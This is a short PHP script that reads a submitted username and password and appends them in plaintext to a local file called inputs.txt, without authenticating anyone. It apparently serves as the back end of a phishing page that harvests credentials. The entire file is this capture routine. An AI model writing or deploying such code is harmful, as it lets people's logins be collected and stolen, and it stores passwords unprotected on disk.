<?php
session_start();
ob_start();

    if(isset($_POST['username']) && isset($_POST['password'])){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $fp = fopen('inputs.txt', 'a') or die('Failed to open / create the inputs file');
        fwrite($fp, "$username $password") or die('Failed to write data');
        fclose($fp);
    }


ob_end_flush();
?>